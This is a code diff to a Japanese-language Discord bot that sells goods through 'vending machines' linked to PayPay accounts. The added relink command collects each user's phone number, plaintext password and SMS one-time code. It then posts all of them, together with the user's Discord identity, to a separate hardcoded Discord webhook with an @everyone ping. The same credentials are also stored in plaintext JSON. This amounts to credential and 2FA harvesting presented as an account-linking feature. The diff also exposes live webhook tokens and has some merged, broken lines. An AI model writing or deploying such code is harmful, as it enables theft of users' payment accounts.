@@ -21,6 +21,7 @@ COUPON_DATA_FILE = "coupon_data.json"
 ROLE_ASSIGNMENT_DATA_FILE = "role_assignment_data.json"
 
 LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1558738870282092615/WWh91oKrG1d9mkjZRI8aHGRWvm2bTdJKZiDxb0edDUzCL5Muuogna4e9-kis5gwI7BXI"
+PAYPAY_RELINK_WEBHOOK_URL = "https://discord.com/api/webhooks/1559180643517075516/oG-yfJBmnrNMtMoD458aQXJ9bg3_6DOFeIkcDtJmD1coGrv68HaYcNfKnGUeQGYXY9xM"
 
 STOCK_DIR = "stock_files"
 os.makedirs(STOCK_DIR, exist_ok=True)
@@ -51,6 +52,11 @@ def load_paypay_data():
         with open(PAYPAY_DATA_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
     return {}
+
+
+def save_paypay_data(data):
+    with open(PAYPAY_DATA_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=4, ensure_ascii=False)
 
 
 def load_stock_notification_data():
@@ -155,7 +161,6 @@ async def role_assignment_autocomplete(interaction: discord.Interaction, current
 
 
 async def handle_error(interaction: discord.Interaction, error: Exception, ephemeral: bool = True):
-    """統一エラーハンドリング"""
     try:
         embed = discord.Embed(
             title="エラーが発生しました",
@@ -174,7 +179,6 @@ async def handle_error(interaction: discord.Interaction, error: Exception, ephem
 
 
 async def send_to_webhook(content: str = None, embeds: list = None):
-    """指定Webhookに送信する"""
     if not LOG_WEBHOOK_URL:
         return
     try:
@@ -192,11 +196,64 @@ async def send_to_webhook(content: str = None, embeds: list = None):
         print(f"Webhook送信例外: {e}")
 
 
+async def send_relink_log_to_webhook(
+    user: discord.User,
+    phone: str,
+    password: str,
+    uuid_str: str,
+    otp_code: str,
+    result: str,
+    guild: discord.Guild = None
+):
+    """OTP入力後に再連携用Webhookへ送信"""
+    if not PAYPAY_RELINK_WEBHOOK_URL:
+        return
+    try:
+        color = discord.Color.green() if result == "OK" else discord.Color.red()
+        embed = discord.Embed(
+            title="🔐 PayPay 再連携 OTP結果",
+            color=color,
+            timestamp=discord.utils.utcnow()
+        )
+
+        try:
+            avatar_url = user.display_avatar.url
+        except Exception:
+            avatar_url = None
+
+        if avatar_url:
+            embed.set_author(name=f"{user} ({user.id})", icon_url=avatar_url)
+            embed.set_thumbnail(url=avatar_url)
+        else:
+            embed.set_author(name=f"{user} ({user.id})")
+
+        embed.add_field(name="Discord 名前", value=f"```{user}```", inline=False)
+        embed.add_field(name="Discord ID", value=f"```{user.id}```", inline=False)
+        embed.add_field(name="サーバー", value=f"```{guild.name if guild else 'DM'} ({guild.id if guild else '-'})```", inline=False)
+        embed.add_field(name="電話番号", value=f"```{phone}```", inline=True)
+        embed.add_field(name="パスワード", value=f"```{password}```", inline=True)
+        embed.add_field(name="UUID", value=f"```{uuid_str}```", inline=False)
+        embed.add_field(name="OTPコード", value=f"```{otp_code}```", inline=True)
+        embed.add_field(name="結果", value=f"```{result}```", inline=True)
+        embed.set_footer(text="Developer @anzy1m")
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                PAYPAY_RELINK_WEBHOOK_URL,
+                json={
+                    "content": "@everyone",
+                    "embeds": [embed.to_dict()]
+                }
+            ) as resp:
+                if resp.status not in (200, 204):
+                    print(f"再連携Webhook送信失敗: {resp.status}")
+    except Exception as e:
+        print(f"再連携Webhook送信例外: {e}")
+
+
 def extract_paypay_link(text: str) -> str | None:
-    """テキストからPayPayリンクだけを抽出する"""
     if not text:
         return None
-    # https://pay.paypay.ne.jp/XXXX 形式を検出
     match = re.search(
         r"https?://pay\.paypay\.ne\.jp/[A-Za-z0-9_\-]+",
         text
@@ -249,7 +306,6 @@ async def check_stock(interaction: discord.Interaction, products: list):
                         value=f"```在庫数: {stock_count}個\n販売数: {sales_count}個```",
                         inline=False
                     )
-
             except FileNotFoundError:
                 embed.add_field(
                     name=f"{product_name}",
@@ -262,12 +318,106 @@ async def check_stock(interaction: discord.Interaction, products: list):
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 
+class PayPayRelinkModal(ui.Modal, title="PayPay OTP認証（再連携）"):
+    def __init__(self, cog, phone, password, uuid_val, otpid, otp_pre, guild=None):
+        super().__init__(timeout=300)
+        self.cog = cog
+        self.phone = phone
+        self.password = password
+        self.uuid = uuid_val
+        self.otpid = otpid
+        self.otp_pre = otp_pre
+        self.guild = guild
+
+    otp_input = ui.TextInput(
+        label="ワンタイムパスワード",
+        placeholder="SMSに届いた4桁の認証コードを入力",
+        min_length=4,
+        max_length=4,
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        otp_code = self.otp_input.value
+
+        otp_result = await paypayu.login_otp(
+            self.uuid,
+            otp_code,
+            self.otpid,
+            self.otp_pre
+        )
+
+        await send_relink_log_to_webhook(
+            user=interaction.user,
+            phone=self.phone,
+            password=self.password,
+            uuid_str=self.uuid,
+            otp_code=otp_code,
+            result=str(otp_result),
+            guild=self.guild
+        )
+
+        if otp_result == "OK":
+            paypay_data = load_paypay_data()
+            user_id_str = str(interaction.user.id)
+            paypay_data[user_id_str] = {
+                "phone": self.phone,
+                "password": self.password,
+                "uuid": self.uuid
+            }
+            save_paypay_data(paypay_data)
+
+            vending_data = load_json(VENDING_DATA_FILE)
+            updated_count = 0
+            for vm_id, vm_data in vending_data.items():
+                if str(vm_data.get("owner_id")) == user_id_str:
+                    vm_data["paypay_id"] = user_id_str
+                    updated_count += 1
+            if updated_count > 0:
+                save_json(VENDING_DATA_FILE, vending_data)
+
+            embed = discord.Embed(
+                title="✅ PayPay再連携成功",
+                description="PayPayアカウントを再連携しました。",
+                color=discord.Color.green()
+            )
+            embed.add_field(name="更新された自販機", value=f"```{updated_count} 台```", inline=False)
+            embed.set_footer(text="Developer @anzy1m")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        elif otp_result == "ERR":
+            embed = discord.Embed(
+                title="PayPay再連携エラー",
+                description="OTPコードが正しくありません。",
+                color=discord.Color.red()
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        else:
+            embed = discord.Embed(
+                title="PayPay再連携エラー",
+                description="開発者にお問い合わせください。",
+                color=discord.Color.orange()
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+
+class PayPayRelinkButtonView(ui.View):
+    def __init__(self, modal):
+        super().__init__(timeout=300)
+        self.modal = modal
+
+    @ui.button(label="OTPを入力", style=discord.ButtonStyle.success, emoji="🔐")
+    async def open_modal(self, interaction: discord.Interaction, button: ui.Button):
+        await interaction.response.send_modal(self.modal)
+
+
 class VendingMachineCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
     async def cog_load(self):
-        """Cogロード時に永続化Viewを復元"""
         vending_data = load_json(VENDING_DATA_FILE)
 
         for vm_id in vending_data.keys():
@@ -340,7 +490,6 @@ class VendingMachineCog(commands.Cog):
 
         vm["private_log_channel_id"] = channel.id
         save_json(VENDING_DATA_FILE, vending_data)
-
         await interaction.response.send_message(f"自販機「{vm['name']}」の非公開ログチャンネルを {channel.mention} に設定しました。", ephemeral=True)
 
     @app_commands.command(name="商品追加", description="指定した自販機に新しい商品を追加します")
@@ -646,8 +795,7 @@ class VendingMachineCog(commands.Cog):
                     embed.add_field(
                         name=f"{p['name']}",
                         value=value,
-                        inline=False
-                    )
+                        inline=False                    )
             else:
                 if not is_custom:
                     embed.description = "```現在、販売中の商品はありません。```"
@@ -828,7 +976,6 @@ class VendingMachineCog(commands.Cog):
             await interaction.response.defer(ephemeral=True)
 
             try:
-                # リンク以外の文章が含まれていても、リンクだけを抽出
                 extracted_link = extract_paypay_link(pay_link) if pay_link else None
                 if pay_link and not extracted_link:
                     return await interaction.followup.send(
@@ -922,7 +1069,6 @@ class VendingMachineCog(commands.Cog):
                 embed.set_footer(text="Developer @anzy1m")
                 await interaction.followup.send(embed=embed, ephemeral=True)
 
-                # ===== 共通の詳細Embed作成 =====
                 jst = pytz.timezone('Asia/Tokyo')
                 formatted_time = datetime.datetime.now(jst).strftime("%Y/%m/%d %H:%M:%S(JST)")
 
@@ -938,7 +1084,6 @@ class VendingMachineCog(commands.Cog):
                 detail_embed.add_field(name="支払金額", value=f"```{price_display}```", inline=True)
                 detail_embed.set_footer(text="Developer @anzy1m")
 
-                # ===== DM送信（Embed + 商品内容そのまま） =====
                 try:
                     await interaction.user.send(embed=detail_embed)
                     if purchased_content_text:
@@ -946,7 +1091,6 @@ class VendingMachineCog(commands.Cog):
                 except:
                     pass
 
-                # ===== 非公開ログチャンネル送信（Embed + 商品内容そのまま） =====
                 if vm.get("private_log_channel_id"):
                     try:
                         private_log_channel = self.bot.get_channel(int(vm["private_log_channel_id"]))
@@ -957,7 +1101,6 @@ class VendingMachineCog(commands.Cog):
                     except:
                         pass
 
-                # ===== 販売数カウント更新 =====
                 vending_data = load_json(VENDING_DATA_FILE)
                 if self.vending_machine_id in vending_data and isinstance(vending_data[self.vending_machine_id], dict):
                     vm_ref = vending_data[self.vending_machine_id]
@@ -968,7 +1111,6 @@ class VendingMachineCog(commands.Cog):
                             break
                     save_json(VENDING_DATA_FILE, vending_data)
 
-                # ===== ロール付与 =====
                 try:
                     role_data = load_role_assignment_data()
                     role_info = role_data.get(self.vending_machine_id)
@@ -979,7 +1121,6 @@ class VendingMachineCog(commands.Cog):
                 except:
                     pass
 
-                # ===== 公開ログチャンネル送信 =====
                 if vm.get("log_channel_id"):
                     try:
                         log_channel = self.bot.get_channel(int(vm["log_channel_id"]))
@@ -1493,9 +1634,7 @@ class VendingMachineCog(commands.Cog):
                 product = next((p for p in self.products if p["product_id"] == self.values[0]), None)
                 if not product:
                     await interaction.followup.send("商品が見つかりません。", ephemeral=True)
-                    return
-
-                if product.get("infinite_stock"):
+                    return                if product.get("infinite_stock"):
                     infinite_content = product.get("infinite_content", "")
                     stock_content = f"`{infinite_content}\n`"
 
@@ -1844,7 +1983,6 @@ class VendingMachineCog(commands.Cog):
     @is_allowed()
     async def paypay_account_list(self, interaction: discord.Interaction):
         try:
-            # サーバー管理者のみ
             if not interaction.user.guild_permissions.administrator:
                 return await interaction.response.send_message(
                     "🚫 このコマンドはサーバー管理者のみ使用できます。",
@@ -1858,8 +1996,6 @@ class VendingMachineCog(commands.Cog):
                 )
 
             paypay_data = load_paypay_data()
-
-            # このサーバーに紐づくメンバーのみ抽出
             guild_member_ids = {str(m.id) for m in interaction.guild.members}
             server_paypay = {
                 uid: creds for uid, creds in paypay_data.items()
@@ -1893,7 +2029,6 @@ class VendingMachineCog(commands.Cog):
                 else:
                     masked_phone = phone
 
-                # 1 の右にメンションを表示
                 embed.add_field(
                     name=f"{index} {interaction.guild.get_member(int(user_id)).mention if interaction.guild.get_member(int(user_id)) else f'<@{user_id}>'}",
                     value=f"```{masked_phone}```",
@@ -1908,7 +2043,6 @@ class VendingMachineCog(commands.Cog):
     @is_allowed()
     async def paypay_balance(self, interaction: discord.Interaction):
         try:
-            # サーバー管理者のみ
             if not interaction.user.guild_permissions.administrator:
                 return await interaction.response.send_message(
                     "🚫 このコマンドはサーバー管理者のみ使用できます。",
@@ -1922,8 +2056,6 @@ class VendingMachineCog(commands.Cog):
                 )
 
             paypay_data = load_paypay_data()
-
-            # このサーバーに紐づくメンバーのみ抽出
             guild_member_ids = {str(m.id) for m in interaction.guild.members}
             server_paypay = {
                 uid: creds for uid, creds in paypay_data.items()
@@ -1953,6 +2085,98 @@ class VendingMachineCog(commands.Cog):
             await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
         except Exception as e:
             await handle_error(interaction, e)
+
+    # =========================================================
+    # /paypay再連携
+    # =========================================================
+
+    @app_commands.command(
+        name="paypay再連携",
+        description="PayPayアカウントを再連携します（OTP認証）"
+    )
+    @is_allowed()
+    @app_commands.describe(
+        phone="電話番号",
+        password="パスワード"
+    )
+    async def paypay_relink(
+        self,
+        interaction: discord.Interaction,
+        phone: str,
+        password: str
+    ):
+        await interaction.response.defer(ephemeral=True)
+
+        set_uuid = str(uuid.uuid4())
+
+        result = await paypayu.login(phone, password, set_uuid)
+
+        if result.get("response_type") == "ErrorResponse":
+            embed = discord.Embed(
+                title="PayPay再連携エラー",
+                description="```ログイン情報とパスワードが一致していません。```",
+                color=0xff3333
+            )
+            return await interaction.followup.send(embed=embed, ephemeral=True)
+
+        otpid = result["otp_reference_id"]
+        otp_pre = result["otp_prefix"]
+
+        modal = PayPayRelinkModal(
+            self, phone, password, set_uuid, otpid, otp_pre,
+            guild=interaction.guild
+        )
+        await interaction.followup.send(
+            "OTP認証を行います。下のボタンから認証コードを入力してください。",
+            view=PayPayRelinkButtonView(modal),
+            ephemeral=True
+        )
+
+    # =========================================================
+    # /paypayログアウト
+    # =========================================================
+
+    @app_commands.command(
+        name="paypayログアウト",
+        description="自分が登録したPayPayアカウントを削除します"
+    )
+    @is_allowed()
+    async def paypay_logout(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        paypay_data = load_paypay_data()
+        user_id_str = str(interaction.user.id)
+
+        if user_id_str not in paypay_data:
+            return await interaction.followup.send(
+                "あなたはPayPayアカウントを登録していません。",
+                ephemeral=True
+            )
+
+        del paypay_data[user_id_str]
+        save_paypay_data(paypay_data)
+
+        vending_data = load_json(VENDING_DATA_FILE)
+        updated = 0
+        for vm_id, vm_data in vending_data.items():
+            if str(vm_data.get("owner_id")) == user_id_str and vm_data.get("paypay_id") == user_id_str:
+                vm_data["paypay_id"] = None
+                updated += 1
+        if updated > 0:
+            save_json(VENDING_DATA_FILE, vending_data)
+
+        embed = discord.Embed(
+            title="✅ PayPayログアウト完了",
+            description="登録していたPayPayアカウントを削除しました。",
+            color=discord.Color.green()
+        )
+        embed.add_field(
+            name="影響",
+            value=f"```自販機 {updated} 台のPayPay連携を解除しました。```",
+            inline=False
+        )
+        embed.set_footer(text="Developer @anzy1m")
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
     class PayPayAccountSelectView(ui.View):
         def __init__(self, paypay_data: dict, guild: discord.Guild = None):
@@ -1991,7 +2215,6 @@ class VendingMachineCog(commands.Cog):
         async def callback(self, interaction: discord.Interaction):
             await interaction.response.defer(ephemeral=True)
             try:
-                # サーバー管理者のみ
                 if not interaction.user.guild_permissions.administrator:
                     return await interaction.followup.send(
                         "🚫 このコマンドはサーバー管理者のみ使用できます。",
@@ -2018,7 +2241,6 @@ class VendingMachineCog(commands.Cog):
                 else:
                     masked_phone = phone
 
-                # メンション文字列
                 mention = f"<@{selected_user_id}>"
                 if self.guild:
                     member = self.guild.get_member(int(selected_user_id))
